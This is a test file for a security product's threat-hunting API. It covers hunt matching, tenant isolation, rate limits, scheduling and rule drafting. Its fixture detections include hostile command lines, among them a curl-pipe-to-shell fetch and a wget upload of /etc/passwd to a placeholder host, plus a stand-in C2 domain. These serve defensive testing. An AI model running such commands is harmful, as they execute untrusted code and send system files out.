import { afterAll, beforeEach, describe, expect, it } from "vitest";
import { NextRequest } from "next/server";
import {
  cleanDatabase,
  createTestAgent,
  createTestDetection,
  createTestTenant,
  prisma,
} from "../helpers/db";
import { createTenantHeaders } from "../helpers/http";
import { GET as listHunts, POST as createHunt } from "@/app/api/hunts/route";
import { DELETE as deleteHunt, GET as getHunt, PATCH as patchHunt } from "@/app/api/hunts/[id]/route";
import { POST as runHuntRoute } from "@/app/api/hunts/[id]/run/route";
import { POST as graduateHunt } from "@/app/api/hunts/[id]/graduate/route";
import { GET as runHuntsCron } from "@/app/api/cron/run-hunts/route";
import {
  HUNT_RUNS_KEPT,
  HUNT_TRANSACTION_TIMEOUT_MS,
  MAX_RUNS_PER_TENANT_PER_MINUTE,
} from "@/lib/hunt";
import { dueHunts, pruneHuntRuns, runHunt } from "@/lib/hunt-runner";
import { recordObservations } from "@/lib/prevalence";
import { Prisma } from "@prisma/client";

const HOUR = 3_600_000;
const query = { version: 1, lastHours: 24, techniques: ["T1059"] };

function req(url: string, tenantId: string, method = "GET", body?: unknown) {
  return new NextRequest(`http://localhost${url}`, {
    method,
    headers: createTenantHeaders(tenantId, "analyst-1"),
    body: body === undefined ? undefined : JSON.stringify(body),
  });
}
const ctx = (id: string) => ({ params: { id } });

async function create(tenantId: string, extra: Record<string, unknown> = {}) {
  const res = await createHunt(req("/api/hunts", tenantId, "POST", { name: "h", query, ...extra }));
  expect(res.status).toBe(201);
  return (await res.json()).hunt as { id: string; version: number };
}

describe("saved hunts (real database)", () => {
  beforeEach(async () => {
    await cleanDatabase();
  });
  afterAll(async () => {
    await cleanDatabase();
    await prisma.$disconnect();
  });

  it("creates a hunt owned by the session user, and lists it with its latest run", async () => {
    const tenant = await createTestTenant();
    const hunt = await create(tenant.id, { scheduleMinutes: 60 });
    const row = await prisma.hunt.findUniqueOrThrow({ where: { id: hunt.id } });
    expect(row).toMatchObject({ ownerId: "analyst-1", version: 1, scheduleMinutes: 60, active: true });

    await runHuntRoute(req(`/api/hunts/${hunt.id}/run`, tenant.id, "POST"), ctx(hunt.id));
    const listed = (await (await listHunts(req("/api/hunts", tenant.id))).json()).hunts;
    expect(listed).toHaveLength(1);
    expect(listed[0].lastRun).toMatchObject({ trigger: "manual", matchCount: 0 });
  });

  it("rejects an invalid body with 400 and never reaches the database", async () => {
    const tenant = await createTestTenant();
    const bad = [
      { name: "h", query: { ...query, lastHours: 0 } },
      { name: "h", query, tenantId: "someone-else" },
      { name: "", query },
    ];
    for (const body of bad) {
      expect((await createHunt(req("/api/hunts", tenant.id, "POST", body))).status).toBe(400);
    }
    expect(await prisma.hunt.count()).toBe(0);
  });

  it("counts matches in the window, by technique, severity, host and text", async () => {
    const tenant = await createTestTenant();
    const a = await createTestAgent(tenant.id);
    const b = await createTestAgent(tenant.id);
    const now = Date.now();
    await createTestDetection(tenant.id, a.id, { technique: "T1059.001", severity: "high", timestamp: new Date(now - HOUR), event: { cmdline: "curl http://x/p | sh" } });
    await createTestDetection(tenant.id, a.id, { technique: "T1059.004", severity: "low", timestamp: new Date(now - 2 * HOUR), event: { cmdline: "ls" } });
    await createTestDetection(tenant.id, b.id, { technique: "T1105", severity: "high", timestamp: new Date(now - HOUR), event: { cmdline: "wget x" } });
    await createTestDetection(tenant.id, a.id, { technique: "T1059.001", severity: "high", timestamp: new Date(now - 48 * HOUR) }); // outside the window

    const run = async (q: object) => {
      const hunt = await prisma.hunt.create({ data: { tenantId: tenant.id, ownerId: "u", name: "h", query: { version: 1, lastHours: 24, ...q } } });
      return runHunt(prisma, hunt, "manual");
    };
    expect((await run({ techniques: ["T1059"] })).matchCount).toBe(2);
    expect((await run({ techniques: ["T1059.001"] })).matchCount).toBe(1);
    expect((await run({ severities: ["high"] })).matchCount).toBe(2);
    expect((await run({ agentIds: [b.id] })).matchCount).toBe(1);
    expect((await run({ text: "CURL" })).matchCount).toBe(1);
    expect((await run({ text: "curl", severities: ["low"] })).matchCount).toBe(0);
    expect((await run({})).matchCount).toBe(3);
  });

  it("matches text literally: % and _ are not wildcards", async () => {
    const tenant = await createTestTenant();
    const a = await createTestAgent(tenant.id);
    await createTestDetection(tenant.id, a.id, { event: { cmdline: "echo 100%_done" } });
    await createTestDetection(tenant.id, a.id, { event: { cmdline: "echo 1000 done" } });
    const hunt = await prisma.hunt.create({ data: { tenantId: tenant.id, ownerId: "u", name: "h", query: { version: 1, lastHours: 24, text: "100%_done" } } });
    expect((await runHunt(prisma, hunt, "manual")).matchCount).toBe(1);
  });

  it("never matches another tenant's detections", async () => {
    const mine = await createTestTenant();
    const theirs = await createTestTenant();
    const theirAgent = await createTestAgent(theirs.id);
    await createTestDetection(theirs.id, theirAgent.id, { technique: "T1059.001" });
    const hunt = await create(mine.id);
    const run = (await (await runHuntRoute(req(`/api/hunts/${hunt.id}/run`, mine.id, "POST"), ctx(hunt.id))).json()).run;
    expect(run.matchCount).toBe(0);
    // Naming the other tenant's agent in the query does not help either.
    const spy = await createTestAgent(theirs.id);
    const sneaky = await prisma.hunt.create({ data: { tenantId: mine.id, ownerId: "u", name: "h", query: { version: 1, lastHours: 24, agentIds: [spy.id] } } });
    expect((await runHunt(prisma, sneaky, "manual")).matchCount).toBe(0);
  });

  it("keeps another tenant's hunt out of reach: 404 on read, update, run and delete", async () => {
    const mine = await createTestTenant();
    const theirs = await createTestTenant();
    const hunt = await create(theirs.id);
    expect((await getHunt(req(`/api/hunts/${hunt.id}`, mine.id), ctx(hunt.id))).status).toBe(404);
    expect((await patchHunt(req(`/api/hunts/${hunt.id}`, mine.id, "PATCH", { active: false }), ctx(hunt.id))).status).toBe(404);
    expect((await runHuntRoute(req(`/api/hunts/${hunt.id}/run`, mine.id, "POST"), ctx(hunt.id))).status).toBe(404);
    expect((await deleteHunt(req(`/api/hunts/${hunt.id}`, mine.id, "DELETE"), ctx(hunt.id))).status).toBe(404);
    expect(await prisma.hunt.count({ where: { id: hunt.id } })).toBe(1);
  });

  it("counts a match as new only if it was ingested since the previous run started", async () => {
    const tenant = await createTestTenant();
    const a = await createTestAgent(tenant.id);
    await createTestDetection(tenant.id, a.id, { technique: "T1059.001" });
    const hunt = await prisma.hunt.create({ data: { tenantId: tenant.id, ownerId: "u", name: "h", query } });
    const pause = () => new Promise((r) => setTimeout(r, 25));

    await pause();
    expect(await runHunt(prisma, hunt, "manual")).toMatchObject({ matchCount: 1, newMatchCount: 1 });
    await pause();
    expect(await runHunt(prisma, hunt, "manual")).toMatchObject({ matchCount: 1, newMatchCount: 0 });
    await pause();
    await createTestDetection(tenant.id, a.id, { technique: "T1059.004" });
    await pause();
    expect(await runHunt(prisma, hunt, "manual")).toMatchObject({ matchCount: 2, newMatchCount: 1 });
  });

  it("bumps the version only when the query changes, and past runs keep the version they ran", async () => {
    const tenant = await createTestTenant();
    const hunt = await create(tenant.id);
    await runHuntRoute(req(`/api/hunts/${hunt.id}/run`, tenant.id, "POST"), ctx(hunt.id));

    const rename = await patchHunt(req(`/api/hunts/${hunt.id}`, tenant.id, "PATCH", { name: "renamed", query: { ...query, techniques: ["T1059"] } }), ctx(hunt.id));
    expect((await rename.json()).hunt.version).toBe(1);

    const edit = await patchHunt(req(`/api/hunts/${hunt.id}`, tenant.id, "PATCH", { query: { ...query, lastHours: 48 } }), ctx(hunt.id));
    expect((await edit.json()).hunt.version).toBe(2);
    await runHuntRoute(req(`/api/hunts/${hunt.id}/run`, tenant.id, "POST"), ctx(hunt.id));

    const history = (await (await getHunt(req(`/api/hunts/${hunt.id}`, tenant.id), ctx(hunt.id))).json()).runs;
    expect(history.map((r: { queryVersion: number }) => r.queryVersion)).toEqual([2, 1]);
    expect(history[1].query.lastHours).toBe(24);
  });

  it("records a hunt whose stored query no longer parses as a failed run, and the cron carries on", async () => {
    const tenant = await createTestTenant();
    const broken = await prisma.hunt.create({ data: { tenantId: tenant.id, ownerId: "u", name: "broken", query: { version: 1, lastHours: 0 }, scheduleMinutes: 60 } });
    const fine = await create(tenant.id, { scheduleMinutes: 60 });

    const run = await runHunt(prisma, broken, "manual");
    expect(run.error).toContain("lastHours");
    expect(run).toMatchObject({ matchCount: 0, newMatchCount: 0 });

    const res = await runHuntsCron(new NextRequest("http://localhost/api/cron/run-hunts", { headers: { Authorization: `Bearer ${process.env.CRON_SECRET}` } }));
    expect(await res.json()).toMatchObject({ ran: 1, failed: 0 });
    expect(await prisma.huntRun.count({ where: { huntId: fine.id, error: null } })).toBe(1);
  });

  it("lets Postgres cancel a search that outlasts Prisma's default 5 s transaction window", async () => {
    // Prisma closes an interactive transaction after 5 s unless told otherwise, which would
    // end a 10 s search with "Transaction already closed" before the statement timeout fires.
    // A 6 s statement timeout and an 8 s sleep show which one wins.
    expect(HUNT_TRANSACTION_TIMEOUT_MS).toBeGreaterThan(10_000);
    const tenant = await createTestTenant();
    const hunt = await prisma.hunt.create({ data: { tenantId: tenant.id, ownerId: "u", name: "slow", query } });
    const run = await runHunt(prisma, hunt, "manual", new Date(), {
      statementTimeoutMs: 6_000,
      beforeQuery: (tx) => tx.$executeRaw(Prisma.sql`SELECT pg_sleep(8)`),
    });
    expect(run.error).toBe("the search exceeded its time limit and was cancelled");
    expect(run).toMatchObject({ matchCount: 0, newMatchCount: 0 });
  }, 20_000);

  it("never stores or returns driver internals for a run that fails", async () => {
    const tenant = await createTestTenant();
    const hunt = await prisma.hunt.create({ data: { tenantId: tenant.id, ownerId: "u", name: "h", query } });
    const run = await runHunt(prisma, hunt, "manual", new Date(), {
      beforeQuery: (tx) => tx.$executeRaw(Prisma.sql`SELECT * FROM table_that_is_not_there`),
    });
    expect(run.error).toBe("the run failed (see the server log)");
    expect(run.error).not.toMatch(/table_that_is_not_there|relation|public\./i);
  });

  it("repairs a hunt whose stored query no longer parses with a PATCH carrying a valid one", async () => {
    const tenant = await createTestTenant();
    const broken = await prisma.hunt.create({ data: { tenantId: tenant.id, ownerId: "u", name: "old", query: { version: 0, whatever: true } } });

    const res = await patchHunt(req(`/api/hunts/${broken.id}`, tenant.id, "PATCH", { query }), ctx(broken.id));

    expect(res.status).toBe(200);
    const hunt = (await res.json()).hunt;
    expect(hunt.version).toBe(2);
    expect(hunt.query).toEqual(query);
    const run = (await (await runHuntRoute(req(`/api/hunts/${broken.id}/run`, tenant.id, "POST"), ctx(broken.id))).json()).run;
    expect(run.error).toBeNull();
  });

  it("still rejects an invalid new query in a PATCH, whatever is stored", async () => {
    const tenant = await createTestTenant();
    const broken = await prisma.hunt.create({ data: { tenantId: tenant.id, ownerId: "u", name: "old", query: { version: 0 } } });
    const res = await patchHunt(req(`/api/hunts/${broken.id}`, tenant.id, "PATCH", { query: { version: 1, lastHours: 0 } }), ctx(broken.id));
    expect(res.status).toBe(400);
  });

  it("answers 429 once a tenant has used its runs for the minute, and only for that tenant", async () => {
    const mine = await createTestTenant();
    const other = await createTestTenant();
    const hunt = await create(mine.id);
    const theirs = await create(other.id);
    await prisma.huntRun.createMany({
      data: Array.from({ length: MAX_RUNS_PER_TENANT_PER_MINUTE }, () => ({
        huntId: hunt.id, tenantId: mine.id, queryVersion: 1, query, sampleDetectionIds: [], trigger: "manual",
      })),
    });

    const blocked = await runHuntRoute(req(`/api/hunts/${hunt.id}/run`, mine.id, "POST"), ctx(hunt.id));
    expect(blocked.status).toBe(429);
    expect(blocked.headers.get("Retry-After")).toBe("30");
    expect((await runHuntRoute(req(`/api/hunts/${theirs.id}/run`, other.id, "POST"), ctx(theirs.id))).status).toBe(200);
  });

  it("bounds parallel manual runs too: simultaneous requests start exactly the allowance and 429 the rest", async () => {
    // The limit used to count finished rows, and a run's row was written when it ended, so
    // N requests sent together all saw the count before any finished and all ran.
    const tenant = await createTestTenant();
    const hunt = await create(tenant.id);
    const parallel = MAX_RUNS_PER_TENANT_PER_MINUTE + 10;

    const responses = await Promise.all(
      Array.from({ length: parallel }, () =>
        runHuntRoute(req(`/api/hunts/${hunt.id}/run`, tenant.id, "POST"), ctx(hunt.id))
      )
    );
    const statuses = responses.map((r) => r.status);

    expect(statuses.filter((s) => s === 200)).toHaveLength(MAX_RUNS_PER_TENANT_PER_MINUTE);
    expect(statuses.filter((s) => s === 429)).toHaveLength(10);
    expect(await prisma.huntRun.count({ where: { tenantId: tenant.id } })).toBe(MAX_RUNS_PER_TENANT_PER_MINUTE);
  }, 30_000);

  it("writes a run's row when it starts, so a run in flight is counted and visible, and finishes it afterwards", async () => {
    const tenant = await createTestTenant();
    const hunt = await prisma.hunt.create({ data: { tenantId: tenant.id, ownerId: "u", name: "slow", query } });

    const running = runHunt(prisma, hunt, "manual", new Date(), {
      beforeQuery: (tx) => tx.$executeRaw(Prisma.sql`SELECT pg_sleep(1)`),
    });
    await new Promise((r) => setTimeout(r, 400));
    const inFlight = await prisma.huntRun.findMany({ where: { huntId: hunt.id } });
    expect(inFlight).toHaveLength(1);
    expect(inFlight[0].finishedAt).toBeNull();
    expect(inFlight[0].error).toBeNull();

    const done = await running;
    expect(done.id).toBe(inFlight[0].id);
    expect(done.finishedAt).not.toBeNull();
    expect(await prisma.huntRun.count({ where: { huntId: hunt.id } })).toBe(1);
  }, 15_000);

  it("does not take a run that never finished (the server died mid-run) for the previous run", async () => {
    const tenant = await createTestTenant();
    const a = await createTestAgent(tenant.id);
    const hunt = await prisma.hunt.create({ data: { tenantId: tenant.id, ownerId: "u", name: "h", query } });
    const pause = () => new Promise((r) => setTimeout(r, 25));

    await createTestDetection(tenant.id, a.id, { technique: "T1059.001" });
    await pause();
    expect(await runHunt(prisma, hunt, "manual")).toMatchObject({ matchCount: 1, newMatchCount: 1 });
    await pause();
    await createTestDetection(tenant.id, a.id, { technique: "T1059.004" });
    await pause();
    // A run that started after that detection and was killed before it stored anything.
    await prisma.huntRun.create({
      data: { huntId: hunt.id, tenantId: tenant.id, queryVersion: 1, query, sampleDetectionIds: [], trigger: "manual" },
    });
    await pause();

    // The baseline is the last run that produced a result, so the second detection is new.
    expect(await runHunt(prisma, hunt, "manual")).toMatchObject({ matchCount: 2, newMatchCount: 1 });
  });

  it("the cron runs only due scheduled hunts, and prunes history", async () => {
    const tenant = await createTestTenant();
    const never = await create(tenant.id, { scheduleMinutes: 60 });
    const fresh = await create(tenant.id, { scheduleMinutes: 60 });
    const stale = await create(tenant.id, { scheduleMinutes: 60 });
    await create(tenant.id); // manual only
    const paused = await create(tenant.id, { scheduleMinutes: 5, active: false });
    const now = Date.now();
    await prisma.huntRun.create({ data: { huntId: fresh.id, tenantId: tenant.id, startedAt: new Date(now - 10 * 60_000), queryVersion: 1, query, sampleDetectionIds: [], trigger: "manual" } });
    await prisma.huntRun.create({ data: { huntId: stale.id, tenantId: tenant.id, startedAt: new Date(now - 2 * HOUR), queryVersion: 1, query, sampleDetectionIds: [], trigger: "manual" } });

    expect((await dueHunts(prisma)).map((h) => h.id).sort()).toEqual([never.id, stale.id].sort());

    const res = await runHuntsCron(new NextRequest("http://localhost/api/cron/run-hunts", { headers: { Authorization: `Bearer ${process.env.CRON_SECRET}` } }));
    expect(await res.json()).toMatchObject({ due: 2, ran: 2, failed: 0 });
    expect(await prisma.huntRun.count({ where: { huntId: never.id, trigger: "schedule" } })).toBe(1);
    expect(await prisma.huntRun.count({ where: { huntId: paused.id } })).toBe(0);
    expect(await prisma.huntRun.count({ where: { huntId: fresh.id } })).toBe(1);

    const again = await runHuntsCron(new NextRequest("http://localhost/api/cron/run-hunts", { headers: { Authorization: `Bearer ${process.env.CRON_SECRET}` } }));
    expect(await again.json()).toMatchObject({ due: 0, ran: 0 });
  });

  it("refuses the cron without the secret", async () => {
    const res = await runHuntsCron(new NextRequest("http://localhost/api/cron/run-hunts"));
    expect([401, 503]).toContain(res.status);
  });

  it("keeps only the newest runs of each hunt", async () => {
    const tenant = await createTestTenant();
    const hunt = await create(tenant.id);
    const other = await create(tenant.id);
    const data = (huntId: string, i: number) => ({ huntId, tenantId: tenant.id, startedAt: new Date(Date.UTC(2026, 0, 1) + i * 1000), queryVersion: 1, query, sampleDetectionIds: [], trigger: "schedule" });
    await prisma.huntRun.createMany({ data: Array.from({ length: HUNT_RUNS_KEPT + 5 }, (_, i) => data(hunt.id, i)) });
    await prisma.huntRun.createMany({ data: [data(other.id, 0)] });

    expect(await pruneHuntRuns(prisma)).toBe(5);
    expect(await prisma.huntRun.count({ where: { huntId: hunt.id } })).toBe(HUNT_RUNS_KEPT);
    const oldest = await prisma.huntRun.findFirstOrThrow({ where: { huntId: hunt.id }, orderBy: { startedAt: "asc" } });
    expect(oldest.startedAt).toEqual(new Date(Date.UTC(2026, 0, 1) + 5 * 1000));
    expect(await prisma.huntRun.count({ where: { huntId: other.id } })).toBe(1);
  });

  it("deleting a hunt deletes its history", async () => {
    const tenant = await createTestTenant();
    const hunt = await create(tenant.id);
    await runHuntRoute(req(`/api/hunts/${hunt.id}/run`, tenant.id, "POST"), ctx(hunt.id));
    expect((await deleteHunt(req(`/api/hunts/${hunt.id}`, tenant.id, "DELETE"), ctx(hunt.id))).status).toBe(204);
    expect(await prisma.huntRun.count()).toBe(0);
  });

describe("POST /api/hunts/[id]/graduate (#618)", () => {
  const execEvent = (image: string, cmdline: string) => ({ type: "exec", image_path: image, cmdline });
  const graduate = (id: string, tenantId: string, body: unknown) =>
    graduateHunt(req(`/api/hunts/${id}/graduate`, tenantId, "POST", body), ctx(id));

  async function huntWithRun(tenantId: string, queryExtra: Record<string, unknown> = {}) {
    const agent = await createTestAgent(tenantId);
    await createTestDetection(tenantId, agent.id, {
      technique: "T1048",
      severity: "high",
      timestamp: new Date(Date.now() - HOUR),
      event: execEvent("/usr/bin/wget", "wget --post-file=/etc/passwd http://x"),
    });
    const hunt = await create(tenantId, { name: "Wget upload", query: { version: 1, lastHours: 24, text: "--post-file", ...queryExtra } });
    return hunt;
  }

  it("answers a reviewable draft from the newest finished run, and writes nothing", async () => {
    const tenant = await createTestTenant();
    const hunt = await huntWithRun(tenant.id);
    expect((await runHuntRoute(req(`/api/hunts/${hunt.id}/run`, tenant.id, "POST"), ctx(hunt.id))).status).toBe(200);

    const res = await graduate(hunt.id, tenant.id, { platform: "linux" });
    expect(res.status).toBe(200);
    const body = await res.json();
    expect(body.files.map((f: { path: string }) => f.path)).toEqual([
      "rules/sigma/linux/wget_upload.yml",
      "rules/sigma/linux/wget_upload.samples.json",
    ]);
    expect(body.files[0].content).toContain("Image|endswith: '/wget'");
    expect(body.files[0].content).toContain("attack.t1048");
    expect(body.todo.length).toBeGreaterThan(0);
  });

  it("says why when the hunt has not run, and when no draft can be made", async () => {
    const tenant = await createTestTenant();
    const hunt = await huntWithRun(tenant.id);
    const early = await graduate(hunt.id, tenant.id, { platform: "linux" });
    expect(early.status).toBe(422);
    expect((await early.json()).error).toMatch(/no finished run/);

    await runHuntRoute(req(`/api/hunts/${hunt.id}/run`, tenant.id, "POST"), ctx(hunt.id));
    const noText = await huntWithRun(tenant.id, { text: undefined });
    await runHuntRoute(req(`/api/hunts/${noText.id}/run`, tenant.id, "POST"), ctx(noText.id));
    const refused = await graduate(noText.id, tenant.id, { platform: "linux" });
    expect(refused.status).toBe(422);
    expect((await refused.json()).problems.join(" ")).toMatch(/negative/);
  });

  it("drafts an IOC set whose hashes and domains carry the fleet's prevalence (#934)", async () => {
    const tenant = await createTestTenant();
    const agents = [await createTestAgent(tenant.id), await createTestAgent(tenant.id)];
    const common = "c".repeat(64);
    const rare = "d".repeat(64);
    const at = new Date();
    for (const agent of agents) await recordObservations(prisma, tenant.id, agent.id, at, [{ kind: "sha256", key: common }]);
    await recordObservations(prisma, tenant.id, agents[0].id, at, [{ kind: "domain", key: "c2.evil.example" }]);
    for (const [sha256, image] of [[common, "/usr/bin/wget"], [rare, "/tmp/dropper"]]) {
      await createTestDetection(tenant.id, agents[0].id, {
        technique: "T1105",
        severity: "high",
        timestamp: new Date(Date.now() - HOUR),
        event: { type: "exec", image_path: image, cmdline: "x --post-file", sha256 },
      });
    }
    await createTestDetection(tenant.id, agents[0].id, {
      technique: "T1071",
      severity: "high",
      timestamp: new Date(Date.now() - HOUR),
      event: { type: "dns_query", query: "C2.Evil.example.", cmdline: "--post-file" },
    });
    const hunt = await create(tenant.id, { name: "Dropper", query: { version: 1, lastHours: 24 } });
    await runHuntRoute(req(`/api/hunts/${hunt.id}/run`, tenant.id, "POST"), ctx(hunt.id));

    const res = await graduate(hunt.id, tenant.id, { kind: "ioc" });
    expect(res.status).toBe(200);
    const text: string = (await res.json()).files[0].content;
    expect(text).toContain(`# seen on 2 of 2 hosts, first ${at.toISOString().slice(0, 10)}\nsha256:${common}`);
    expect(text).toContain(`# never seen on this fleet before\nsha256:${rare}`);
    expect(text).not.toMatch(/widespread/); // 2 hosts is under the 5-host floor
    expect(text).toContain(`hosts, first ${at.toISOString().slice(0, 10)}\ndomain:c2.evil.example`);
  });

  it("is a 400 for a bad body and a 404 for another tenant's hunt", async () => {
    const tenant = await createTestTenant();
    const other = await createTestTenant();
    const hunt = await huntWithRun(tenant.id);
    expect((await graduate(hunt.id, tenant.id, { platform: "bsd" })).status).toBe(400);
    expect((await graduate(hunt.id, other.id, { platform: "linux" })).status).toBe(404);
  });
});
});
